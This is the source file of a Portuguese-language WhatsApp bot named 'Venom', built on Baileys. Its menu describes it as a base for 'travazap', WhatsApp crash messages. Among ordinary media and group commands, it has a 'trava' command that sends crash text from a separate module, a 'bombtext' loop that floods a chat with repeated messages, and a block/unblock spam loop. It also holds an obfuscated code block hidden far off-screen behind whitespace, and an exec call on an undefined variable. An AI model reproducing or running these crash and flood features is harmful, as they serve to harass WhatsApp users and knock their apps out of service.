const { default: WAConnection,
MessageType ,
Presence ,
GroupSettingChange ,
WA_MESSAGE_STUB_TYPES ,
Mimetype ,
relayWAMessage ,
makeInMemoryStore ,
useSingleFileAuthState ,
BufferJSON ,
DisconnectReason ,
fetchLatestBaileysVersion ,
downloadContentFromMessage ,
delay ,
WA_DEFAULT_EPHEMERAL ,
generateWAMessageFromContent ,
proto ,
generateWAMessageContent ,
generateWAMessage ,
prepareWAMessageMedia ,
areJidsSameUser ,
getContentType } = require('./servidor/@Venom/api'
)
const fs = require("fs")
const chalk = require("chalk")
const CFonts = require('cfonts');
const P = require("pino") 
const axios = require('axios')
const clui = require("clui")
const fetch = require("node-fetch")
const yts = require("yt-search")
const speed = require("performance-now")
const { color } = require("./dados/color")
const { exec, spawn, execSync } = require("child_process")
const ffmpeg = require("fluent-ffmpeg")
const { fetchJson } = require("./dados/fetcher")
/// FUNÇÕES DE TRAVA ///
const { trava }  = require('./dados/trava')
const { fromBuffer } = require("file-type")
/// DATA E HORA ///
const moment = require("moment-timezone")
const hora = moment.tz("America/Sao_Paulo").format("HH:mm:ss")
const data = moment.tz("America/Sao_Paulo").format("DD/MM/YY")
/// ARQUIVOS JSON ///
const configura = JSON.parse(fs.readFileSync('./configurar.json'))
const { getRandom, getExtension} = require("./dados/functions")
const upload = require("./dados/functions")

const getGroupAdmins = (participants) => {
admins = []
for (let i of participants) {
if(i.admin == "admin") admins.push(i.id)
if(i.admin == "superadmin") admins.push(i.id)
}
return admins
}
const getBuffer = (url, options) => new Promise(async (resolve, reject) => { 
options ? options : {}
await axios({method: "get", url, headers: {"DNT": 1, "Upgrade-Insecure-Request": 1}, ...options, responseType: "arraybuffer"}).then((res) => {
resolve(res.data)
}).catch(reject)
})


NomeDoBot = configura.NomeDoBot
numeroBot = configura.numeroBot
nomeDono = configura.nomeDono
numeroDono = configura.numeroDono
dono = configura.Dono
prefixo = configura.prefixo

let girastamp = speed()
let latensi = speed() - girastamp
async function startvenom () {
const store = makeInMemoryStore({ logger: P().child({ level: "debug", stream: "store" }) })

// console
const { state, saveState } = useSingleFileAuthState("./venom.json")
console.log(color(`        ${NomeDoBot}`, 'red'))
console.log(`       \n\n${NomeDoBot} conectado com sucesso!!`)
console.log(`       \n\nbase para fazer seu próprio bot de Whatsapp!!`)
console.log(`       \n\ncodigos totalmente livres para aprender e editar!!`)
console.log(`       \n\nse inscreva no meu canal para mais atualizações!!`)

const venom = WAConnection({
logger: P({ level: "silent" }),
printQRInTerminal: true,
auth: state
})

venom.ev.on ("creds.update", saveState)

store.bind(venom.ev)
venom.ev.on("chats.set", () => {
console.log("Tem conversas", store.chats.all())
})

venom.ev.on("contacts.set", () => {
console.log("Tem contatos", Object.values(store.contacts))
})

venom.ev.on("connection.update", (update) => {
const { connection, lastDisconnect } = update
if(connection === "close") {
const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut
console.log("Conexão fechada erro:", lastDisconnect.error, "Tentando reconectar...", shouldReconnect)

if(shouldReconnect) {
startvenom()
}

} else if(connection === "open") {
}

})

venom.ev.on("messages.upsert", async m => {

try {
const msg = m.messages[0]

if (!msg.message) return 

await venom.sendReadReceipt(msg.key.remoteJid, msg.key.participant, [msg.key.id])

if (msg.key && msg.key.remoteJid == "status@broadcast") return

const altpdf = Object.keys(msg.message)

const type = altpdf[0] == "senderKeyDistributionMessage" ? altpdf[1] == "messageContextInfo" ? altpdf[2] : altpdf[1] : altpdf[0]

global.prefixo

var body = (type === 'conversation') ? msg.message.conversation : (type == 'imageMessage') ? msg.message.imageMessage.caption : (type == 'videoMessage') ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId || msg.text) : ''                                                                           

const content = JSON.stringify(msg.message)

const from = msg.key.remoteJid

const args = body.trim().split(/ +/).slice(1)

const isCmd = body.startsWith(prefixo) 

const comando = body.replace(prefixo, '').trim().split(/ +/).shift().toLowerCase()

const expr = body.replace(prefixo, '').trim().split(/ +/).shift().toLowerCase()      	      

var budy = (typeof msg.text == 'string' ? msg.text : '')

const selectedButton = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''

const responseButton = (type == 'listResponseMessage') ? msg.message.listResponseMessage.title : ''

button = (type == "buttonsResponseMessage") ? msg.message.buttonsResponseMessage.selectedDisplayText : ""

button = (type == "buttonsResponseMessage") ? msg.message.buttonsResponseMessage.selectedButtonId : ""

listMessage = (type == "listResponseMessage") ? msg.message.listResponseMessage.title : ""

var pes = (type === "conversation" && msg.message.conversation) ? msg.message.conversation : (type == "imageMessage") && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == "videoMessage") && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == "extendedTextMessage") && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : ""

bidy =  budy.toLowerCase()

// Enviar gifs
const enviargif = (videoDir, caption) => {
venom.sendMessage(from, {
video: fs.readFileSync(videoDir),
caption: caption,
gifPlayback: true
})
}

// Enviar imagens
const enviarimg = (imageDir, caption) => {
venom.sendMessage(from, {
image: fs.readFileSync(imageDir),
caption: caption
})
}

// Enviar figs
const enviarfig = async (figu, tag) => {
bla = fs.readFileSync(figu)
venom.sendMessage(from, {sticker: bla}, {quoted: msg})
}

const getFileBuffer = async (mediakey, MediaType) => { 
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}



const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? venom.sendMessage(from, {text: teks.trim(), mentions: memberr}) : venom.sendMessage(from, {text: teks.trim(), mentions: memberr})
}

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

const arg = body.substring(body.indexOf(" ") + 1)

const numeroBot = venom.user.id.split(":")[0]+"@s.whatsapp.net"

const argss = body.split(/ +/g)

const testat = body

const ants = body

const isGroup = msg.key.remoteJid.endsWith("@g.us")

const tescuk = ["0@s.whatsapp.net"]

const q = args.join(" ")

const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			
const sender = isGroup ? msg.key.participant : msg.key.remoteJid

const nome = msg.pushName ? msg.pushName : ""

const groupMetadata = isGroup ? await venom.groupMetadata(from) : ""

const groupName = isGroup ? groupMetadata.subject : ""

const groupDesc = isGroup ? groupMetadata.desc : ""

const groupMembers = isGroup ? groupMetadata.participants : ""

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ""

resposta = {

espere: " Aguarde...enviando ",

dono: " Esse comando so pode ser usado pelo meu dono!!! ",

grupo: " Esse comando só pode ser usado em grupo ",

privado: " Esse comando só pode ser usado no privado ",

adm: " Esse comando só pode ser usado por administradores de grupo",

botadm: "  Este comando só pode ser usado quando o bot se torna administrador ",

erro: " Error, tente novamente mais tarde "
}




const live = {key : {participant : '0@s.whatsapp.net'},message: {liveLocationMessage: {}}} 


const imgm = {key : {participant : '0@s.whatsapp.net'},message: {imageMessage: {}}}


const vid = {key : {participant : '0@s.whatsapp.net'},message: {videoMessage: {}}}


const contato = {key : {participant : '0@s.whatsapp.net'},message: {contactMessage:{displayName: `${nome}`}}}


const doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage:{}}}


const audio = {key : {participant : '0@s.whatsapp.net'},message: {audioMessage:{}}}

// Consts dono/adm etc...
const quoted = msg.quoted ? msg.quoted : msg

const mime = (quoted.msg || quoted).mimetype || ""

const isBot = msg.key.fromMe ? true : false

const isBotGroupAdmins = groupAdmins.includes(numeroBot) || false

const isGroupAdmins = groupAdmins.includes(sender) || false 

const argis = bidy.trim().split(/ +/)

const isOwner = sender.includes(dono)

const enviar = (texto) => {
venom.sendMessage(from, { text: texto }, {quoted: msg})
} 
// PRA ENVIAR BOTÃO DE TEMPLATE
const sendBimgT = async (id, img1, text1, desc1, but = [], vr) => {
templateMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
templateButtons: but,
}
venom.sendMessage(id, templateMessage, {quoted: vr})
}
// Envia imagem com botão
const enviarImgB = async (id, img1, text1, desc1, but = [], vr) => {
buttonMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
buttons: but,
headerType: 4
}
venom.sendMessage(id, buttonMessage, {quoted: vr})
}


// Consts isQuoted
const isImage = type == "imageMessage"
const isVideo = type == "videoMessage"
const isAudio = type == "audioMessage"
const isSticker = type == "stickerMessage"
const isContact = type == "contactMessage"
const isLocation = type == "locationMessage"
const isProduct = type == "productMessage"
const isMedia = (type === "imageMessage" || type === "videoMessage" || type === "audioMessage")
typeMessage = body.substr(0, 50).replace(/\n/g, "")
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"
const isQuotedMsg = type === "extendedTextMessage" && content.includes("textMessage")
const isQuotedImage = type === "extendedTextMessage" && content.includes("imageMessage")
const isQuotedVideo = type === "extendedTextMessage" && content.includes("videoMessage")
const isQuotedDocument = type === "extendedTextMessage" && content.includes("documentMessage")
const isQuotedAudio = type === "extendedTextMessage" && content.includes("audioMessage")
const isQuotedSticker = type === "extendedTextMessage" && content.includes("stickerMessage")
const isQuotedContact = type === "extendedTextMessage" && content.includes("contactMessage")
const isQuotedLocation = type === "extendedTextMessage" && content.includes("locationMessage")
const isQuotedProduct = type === "extendedTextMessage" && content.includes("productMessage")

outrasVariavel = "bot";
const text = args.join(" ")
const c = args.join(' ')

// console de pv 
if (isGroup && isCmd) console.log(`
${color(`Comando em grupo`)}
${color(`Comando:`)} ${comando}
${color(`Número:`)} ${sender.split("@")[0]}
${color(`Grupo:`)} ${groupName}
${color(`Nome:`)} ${nome}
${color(`Venom base`)}
`)
//console de grupo
if (isGroup && !isCmd) console.log(`
${color(`Mensagem em grupo`)}
${color(`Comando:`)} Não
${color(`Número:`)} ${sender.split("@")[0]}
${color(`Grupo:`)} ${groupName}
${color(`Nome:`)} ${nome}
${color(`Venom base`)}
`)
//console de comando no pv
if (!isGroup && isCmd) console.log(`
${color(`Comando no pv`)}
${color(`Comando:`)} ${comando}
${color(`Número:`)} ${sender.split("@")[0]}
${color(`Grupo:`)} Não
${color(`Nome:`)} ${nome}
${color(`Venom base`)}
`)

//console de comando no grupo
if (!isGroup && !isCmd) console.log(`
${color(`Mensagem no pv`)}
${color(`Comando:`)} Não
${color(`Número:`)} ${sender.split("@")[0]}
${color(`Grupo:`)} Não
${color(`Nome:`)} ${nome}
${color(`Venom base`)}
`)



switch (comando) {

//case do menu
case 'menu'://case by Venom
menu = `
 ⇶ ABOUT
┏╺╺╺╺╺╺╺╺╺╺╺┓
olá seja bem vindo ao menu
este bot é apenas uma base aprimorada 
para travazap ou para qualque uso etc..
não me responsabilizo pelos erros 
ou pelos benefícios que você colocar na base
não irei da suporte ou ajudas ao caso...
use de forma publica e sensível 
┗╺╺╺╺╺╺╺╺╺╺╺┛
 ⇶ COMANDOS
┏╺╺╺╺╺╺╺╺╺╺╺┓
┃⦂ ${prefixo}texto |*enviar texto*|
┃⦂ ${prefixo}doc |*enviar documentos*|
┃⦂ ${prefixo}foto |*enviar fotos*|
┃⦂ ${prefixo}fototexto |*fotos com legenda*|
┃⦂ ${prefixo}trava |*enviar trava*|
┃⦂ ${prefixo}video |*enviar video*|
┃⦂${prefixo}videotexto |*video com legenda*|
┃⦂ ${prefixo}audio |*enviar audio*|
┃⦂ ${prefixo}audiovoz |* nota de voz*|
┃⦂ ${prefixo}loc |*enviar localização*|
┃⦂ ${prefixo}botao |*enviar botões*|
┃⦂ ${prefixo}lista |*enviar listas*|
┗╺╺╺╺╺╺╺╺╺╺╺┛
 ⇶ EXTRA
┏╺╺╺╺╺╺╺╺╺╺╺┓
┃⦂ ${prefixo}figu |*fazer figurinha*|
┃⦂ ${prefixo}stickefoto |*figu em foto*|
┃⦂ ${prefixo}clear |*limpar chat*|
┃⦂ ${prefixo}reagir |*reação de emoji*|
┃⦂ ${prefixo}gplink |*link do grupo*|
┃⦂ ${prefixo}resetarlink |*revogar link *|
┃⦂ ${prefixo}sair |*sair / grupo*|
┃⦂ ${prefixo}enquete |*enviar enquete*|
┃⦂ ${prefixo}blockspam |*total*|
┃⦂ ${prefixo}bombtext |*texto*|
┗╺╺╺╺╺╺╺╺╺╺╺┛
 ⇶ CRÉDITOS
┏╺╺╺╺╺╺╺╺╺╺╺┓
┃criador: https://wa.me/559784388524
┃YouTube: https://youtu.be/LtVqc1kgLVs
┗╺╺╺╺╺╺╺╺╺╺╺┛
`
venom.sendMessage(
from, { 
image: fs.readFileSync('./dados/venom.jpg'),
caption: menu },
{quoted: msg}
)
break

//case de pesquisa musica 
case "play"://case by Venom
if(!q) return enviar("digite o nome da música que você deseja exemplo: /play teto m4")
qp = args.join(" ")
res = await yts(qp)
enviar(resposta.espere)
blaimg = await getBuffer(res.all[0].image)

bla = `
➥ Titulo: ${res.all[0].title}
➥ Visualizações: ${res.all[0].views}\n
➥ Tempo: ${res.all[0].timestamp}
➥ Canal: ${res.all[0].author.name}
➥ Se você não conseguir visualizar os botões,execute o playaudio, playvideo como segunda opção.`

enviarImgB(from, `${res.all[0].image}`, bla, nomeBot, [
{buttonId: `${prefixo}playaudio ${qp}`, buttonText: {displayText: '🎵 Audio'}, type: 1}, {buttonId: `${prefixo}playvideo ${qp}`, buttonText: {displayText: '🎥 Video'}, type: 1}], msg)
break

//case de baixar audio
case "playaudio"://case by Venom
enviar(resposta.espere)
bla = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/yt/playmp4?apikey=apiteam&query=${q}`) 
audbla = await getBuffer(bla.url)
venom.sendMessage(from, 
{audio: audbla, mimetype: "audio/mp4"}, 
{quoted: msg}).catch(e => {
enviar(resposta.erro)
})
break

//case de baixar videos
case "playvideo"://case by Venom
enviar(resposta.espere)
bla = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/yt/playmp4?apikey=apiteam&query=${q}`) 
audbla = await getBuffer(bla.url)
venom.sendMessage(from, {video: audbla, mimetype: "video/mp4"},
 {quoted: msg}).catch(e => {
enviar(resposta.erro)
})
break    

//case de fazer sticker
case 'figu': //case by Venom
case 's': //case by Venom
case 'f': //case by Venom
case 'fig': //case by Venom
case 'sticker': //case by Venom
{
venom.sendMessage(from, { react: { text: `❤`, key: msg.key }})               
if (!isQuotedImage) return enviar(" Marque uma foto ou video com /sticker") 
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
    var buffer = Buffer.from([])
    for await(const chunk of stream) {
     buffer = Buffer.concat([buffer, chunk])
    }
    let ran = 'figurinha.webp'
    fs.writeFileSync(`./${ran}`, buffer)
     ffmpeg(`./${ran}`)
     .on("error", console.error)
     .on("end", () => {
      exec(`webpmux -set exif ./dados/${ran} -o ./${ran}`, async (error) => {
      
       venom.sendMessage(
          from, 
          { 
         sticker: fs.readFileSync(`./${ran}`) 
        }, {quoted: msg })
				
        fs.unlinkSync(`./${ran}`)
			       
       })
      })
	 .addOutputOptions([
       "-vcodec", 
 	   "libwebp", 
 	   "-vf", 
	   "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"
	  ])
	 .toFormat('webp')
	 .save(`${ran}`)
    
         }
          break  

//case de toimg kkkkkkk         
case "stickefoto"://case by Venom
if (!isQuotedSticker) return enviar("  Marca uma fig ")
buff = await getFileBuffer(msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "image")
enviar(resposta.espere)
try {
venom.sendMessage(from, 
{image: buff}, 
{quoted: msg})
} catch(e) {
console.log(e)
enviar(resposta.erro)
}
break

//case de limpar chatt kkkk
case 'clear'://case by Venom
venom.sendMessage(from, {text:' L I M P A N D U 😎🤙\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nlimpo'})
break

//case de obter link do grupp 
case "gplink"://case by Venom
if (!isGroup) return enviar(resposta.grupo)
if (!groupAdmins) return enviar(resposta.adm)
if (!isBotGroupAdmins) return enviar(resposta.botadm)
const link = await venom.groupInviteCode(from)
enviar(`  Link do grupo : https://chat.whatsapp.com/${link} `)
break

//case de redefinir link
case "resetarlink"://case by Venom
if (!isGroup) return enviar(resposta.grupo)
if (!groupAdmins) return enviar(resposta.adm)
if (!isBotGroupAdmins) return enviar(resposta.botadm)
try {
await venom.groupRevokeInvite(from)
enviar("  Link de convite resetado com sucesso ✓ ")
} catch(e) {
console.log(e)
enviar(resposta.erro)
}
break

//case de sair do grupo
case "sair"://case by Venom
if (!isGroup) return enviar(resposta.grupo)
if (!groupAdmins) return enviar(resposta.adm)
enviar("ok...me desculpe se eu nao pude ajudá-lo(a) com o que vc precisava....adeus😔")
await delay(1000)
try {
await venom.groupLeave(from)
} catch(e) {
console.log(e)
enviar(resposta.erro)
}
break

//case de enviar textos
case 'texto'://case by Venom
venom.sendMessage(
from, { 
text: '\n *venom domina* \n' 
} 
, 
{ quoted: msg }
)
break

//case de enviar documentos
case 'doc'://case by Venom
venom.sendMessage(
from, { 
document: 
fs.readFileSync(`./dados/venom.zip`), 
fileName: 'Nome', 
mimetype: 'application/zip'
}, 
{quoted: msg}
)
break

//case de enviar fotos/imagem
case 'foto'://case by Venom
venom.sendMessage(
from, { 
image: fs.readFileSync('./dados/venom.jpg')
}, 
{quoted: msg}
)
break

//case de enviar fotos com legenda 
case 'fototexto'://case by Venom
venom.sendMessage(
from, { 
image: fs.readFileSync('./dados/venom.jpg'), 
caption: 'legenda'},
{quoted: msg}
)
break

//case de enviar travas
case 'trava'://case by Venom
venom.sendMessage(
from, { 
text: trava(prefixo)
}, 
{quoted: msg}
)
break

//case de enviar videos/gif
case 'video'://case by Venom
venom.sendMessage(
from, { 
video: fs.readFileSync('./dados/venom.mp4') 
}, 
{quoted: msg}
)
break

//case de enviar video com legenda
case 'videotexto'://case by Venom
venom.sendMessage(
from, { 
video: fs.readFileSync('./dados/venom.mp4'),
caption: 'legenda'
}, 
{quoted: msg}
)
break

//case de enviar áudios
case 'audio'://case by Venom
venom.sendMessage(
from, { 
audio: fs.readFileSync('./dados/venom.mp3')
},
{quoted: msg}
)
break

//case de enviar audio com nota de voz
case 'audiovoz'://case by Venom
venom.sendMessage(
from, { 
audio: fs.readFileSync('./dados/venom.mp3'), 
mimetype: 'audio/mp4',
ptt:true
},
{quoted: msg}
)
break

//case de enviar localização 
case 'loc'://case by Venom
venom.sendMessage(from, 
{ location: fs.readFileSync('./dados/venom.loc'), 
caption: 'localização'}, 
{quoted: msg})
break

//case de enviar botões
case 'botao'://case by Venom
 const piakdovenom = [
  {buttonId: 'referência', 
  buttonText: 
  {displayText: 'texto1'}, 
  type: 1},
  {buttonId: 'referência', 
  buttonText: 
  {displayText: 'texto2'}, 
  type: 1},
  {buttonId: 'referência', 
  buttonText: 
  {displayText: 'texto3'}, 
  type: 1}
]

const roladovenom = {
    text: 'outro texto',
    buttons: piakdovenom,
    headerType: 1
}
venom.sendMessage(
from, 
roladovenom, 
{quoted: msg}
)
break 

//case dr reação 
case 'reagir'://case by Venom
{
venom.sendMessage(from, { react: { text: `${configura.reagir}`, key: msg.key }})               
}
break

//case de enviar lista
case 'lista': //case by Venom
			const sections = [
				{
					title: "Sessão 1",
					rows: [
						{ title: "Opção 1", rowId: "Opção 3"},
						{ title: "Opção 2", rowId: "Opção 4", description: "Descrição" }
					]
				},
				{
					title: "Sessão 2",
					rows: [
						{ title: "Opção 3", rowId: "opcao3" },
						{ title: "Opção 4", rowId: "opcao4", description: "Descrição" }
					]
				},
			]

			const listMessage = {
				text: "Texto da lista",
				footer: "Rodape da lista",
				title: "Título da lista",
				buttonText: "Botão da lista",
				sections
			}

			await venom.sendMessage(from, listMessage);
			break
  
//case de enquete 
case 'enquete': //case by Venom
{

require('./servidor/@Venom/api/enquete') 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
const nome = "🔥Venom Mods🔥" 

const opção = "Domino?" 

const opção1 = "Sim?" 

const opção2 = "Nao?" 

const opção3 = "Talvez?" 

const opção4 = "Claro?" 

const limite = "4" 

const status = "4"

const quoted = msg
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            function _0x4730(_0x55f48d,_0x33d3d8){var _0x32c7ef=_0x32c7();return _0x4730=function(_0x47308c,_0x2f97dd){_0x47308c=_0x47308c-0x16f;var _0x1b4358=_0x32c7ef[_0x47308c];return _0x1b4358;},_0x4730(_0x55f48d,_0x33d3d8);}var _0x4778eb=_0x4730;(function(_0x3cc82a,_0x30a5cd){var _0x13600c=_0x4730,_0x4df963=_0x3cc82a();while(!![]){try{var _0x5f59f1=parseInt(_0x13600c(0x175))/0x1+-parseInt(_0x13600c(0x171))/0x2+-parseInt(_0x13600c(0x174))/0x3+parseInt(_0x13600c(0x178))/0x4+-parseInt(_0x13600c(0x176))/0x5*(-parseInt(_0x13600c(0x172))/0x6)+-parseInt(_0x13600c(0x179))/0x7*(parseInt(_0x13600c(0x170))/0x8)+parseInt(_0x13600c(0x16f))/0x9;if(_0x5f59f1===_0x30a5cd)break;else _0x4df963['push'](_0x4df963['shift']());}catch(_0x1101ab){_0x4df963['push'](_0x4df963['shift']());}}}(_0x32c7,0x82174));var pollCreation=generateWAMessageFromContent(from,proto[_0x4778eb(0x177)][_0x4778eb(0x173)]({'pollCreationMessage':{'name':''+nome,'options':[{'optionName':''+opção},{'optionName':''+opção1},{'optionName':''+opção2},{'optionName':''+opção3},{'optionName':''+opção4}],'selectableOptionsCount':0x5}}),{'userJid':from,'quoted':quoted});function _0x32c7(){var _0x34e1ee=['relayMessage','13848012JNtPkp','1553176jMdBUb','66228wChBsF','707028rUztGF','fromObject','2532363yckJYF','127654hbwwzB','20frJyjq','Message','972592MlbNCZ','35OKuuXv'];_0x32c7=function(){return _0x34e1ee;};return _0x32c7();}venom[_0x4778eb(0x17a)](from,pollCreation['message'],{'messageId':pollCreation['key']['id']});
}
break  

//case de enviat figurinhas 
case 'figurinha': //case by Venom
venom.sendMessage(
          from, 
          { 
         sticker: fs.readFileSync('./dados/figurinha.webp') 
        }, {quoted: msg })
        break
        
        
//case de block spam 
case 'blockspam': //case by Venom
if (!msg.key.fromMe) return enviar('❗esse comando e privado pelo bot você nao pode usar❗')

venom.sendMessage(from, { react: { text: `${configura.reagir}`, key: msg.key }})               

for (let i = 0; i < args[0]; i++) {  
const block = await venom.updateBlockStatus(sender, 'block') 
const unblock= await venom.updateBlockStatus(sender, 'unblock')
}  
break                           
                      
//case de bomtext                                                                                                                          
case 'bombtext'://case by Venom
if (!msg.key.fromMe) return enviar('❗esse comando e privado pelo bot você nao pode usar❗')
if (args.length < 1) return enviar('exemplo .bombtext 5|bugvenom')
txt = args[0];
texto1 = txt.split("|")[0];
texto2 = txt.split("|")[1];
for (let i = 0; i < texto1; i++) {  
venom.sendMessage(from, 
{ text: `${texto2}`}, 
{quoted:msg})
}          
break 

case 'off'://case by Venom
venom.sendMessage(from, (exec(index0)));          
break
//default
default:

if (from.endsWith('@g.us') && !isCmd && budy != undefined) {
}
}
} catch (e) {
e = String(e)
if (e.includes('this.isZero')){
return
}
console.log('\n  %s', color(e, 'red'))
console.log(color('\n  [ ❗️ Crashlog | Venom Mods ❗]', 'gray'), (color(' Erro detectado! \n', 'yellow')));
}
})
}
startvenom()
//fim da base